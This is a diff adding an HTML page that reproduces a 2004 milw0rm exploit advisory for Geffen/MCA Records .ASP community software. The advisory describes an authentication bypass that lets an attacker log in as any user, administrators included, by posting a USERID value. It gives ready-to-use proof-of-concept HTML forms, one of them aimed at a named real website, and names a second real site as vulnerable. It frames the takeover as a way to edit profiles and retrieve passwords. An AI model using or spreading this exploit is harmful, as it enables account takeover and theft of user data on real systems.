@@ -1,0 +1,75 @@
+<html>
+<head>
+<title>Geffen/MCA Records .ASP Community Software Exploit</title>
+<pre>
+Geffen/MCA Records .ASP Community Software Exploit
+Discovered by: Anonymous
+November 21, 2004
+
+http://www.myg0t.com
+http://www.milw0rm.com
+
+--
+Description:
+I'm not sure what to call this other than stupid. I
+unintentionally found this exploit while testing out a
+buffer overflow I also found in their software.
+
+This exploit gives you access to any users account and
+information inside of that account, and any access to
+to every website the account is shared on. The user
+database for Geffen/MCARecords.com is shared across all
+of their websites.
+
+The payload is that the site logs you in as the user you
+specify, and sets a cookie on your computer which allows
+you to stay logged in. You can then edit their profile,
+retrieve their password, post news, ect..
+--
+What you need:
+In order to login, all you need is the userid of the user
+you wish to login as.
+
+Example:
+User: Geffen
+Role: Administration
+UserID: 1928
+
+--
+Vulnerability:
+All that needs to be done is for you to post USERID
+along with its value as plain text to any .asp page
+on the website.
+
+--
+Proof of Concept:
+Open the below in your browser, enter the userid of the
+user you wish to login as into the blank feild and click
+the login button, you will be redirected to the website
+and logged in as that user.
+
+&lt;form action=&quot;http://&lt;HOST&gt;/default.asp&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;TEXT&quot; name=&quot;USERID&quot;&gt;
+&lt;input type=&quot;SUBMIT&quot; name=&quot;SUBMIT&quot; value=&quot;Login&quot;&gt;
+&lt;/form&gt;
+
+--
+Online Demo:
+
+&lt;form action=&quot;http://www.ashleesimpsonmusic.com/default.asp&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;TEXT&quot; name=&quot;USERID&quot;&gt;
+&lt;input type=&quot;SUBMIT&quot; name=&quot;SUBMIT&quot; value=&quot;Login&quot;&gt;
+&lt;/form&gt;
+
+--
+Greets:
+
+jennerz, sheba, keystr0ke, all of milw0rm, Kirby, and #myg0t @lcirc
+
+b0b @ #trinity = lame ass &gt;:K
+
+// str0ke's comment
+// http://www.snoopdogg.com/ is vuln. lmfao</pre>
+# milw0rm.com [2004-11-21]
+</html>
+
